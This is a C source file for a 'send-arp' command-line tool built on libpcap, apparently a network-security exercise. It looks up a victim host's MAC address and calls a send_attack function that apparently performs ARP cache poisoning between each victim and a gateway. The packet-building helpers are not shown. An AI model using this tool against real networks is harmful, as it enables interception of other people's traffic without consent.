#include "send-arp.h"
#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1]; 
    char errbuf[PCAP_ERRBUF_SIZE];

    uint32_t my_ip; // 
    uint8_t my_mac[6];

    if(get_my_ip(dev, &my_ip) == false) return -1; // network byte order
    if(get_my_mac(dev, my_mac) == false) return -1; 

    for (int i = 1; i < (argc / 2); i++) {
        char* sender = argv[2 * i];     // string (victim)
        char* target = argv[2 * i + 1]; // string (gateway)

        /*
        printf("%d -> ", i);
        printf("Sender : %s ", sender); 
        printf("Target : %s\n", target);
        */

        // string -> binary
        uint32_t sender_ip;
        uint32_t target_ip;
        if (inet_pton(AF_INET, sender, &sender_ip) != 1) {
            printf("wrong sender ip: %s\n", sender);
            continue;   
        }
        if (inet_pton(AF_INET, target, &target_ip) != 1) {
            printf("wrong target ip: %s\n", target);
            continue;   
        }

        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
            printf("couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }

        uint8_t sender_mac[6];
        if(get_sender_mac(handle, my_ip, my_mac, sender_ip, sender_mac) == false){
            printf("couldn't get sender mac\n");
            pcap_close(handle);
            continue;
        }
        /*
        char mac_str[18];
        if (mac_to_str(sender_mac, mac_str, sizeof(mac_str)) != NULL) {
            printf("Attack %s\n", mac_str);
        }
        */
        send_attack(handle, my_mac, target_ip, sender_mac, sender_ip);

        pcap_close(handle);
    }

    return 0;
}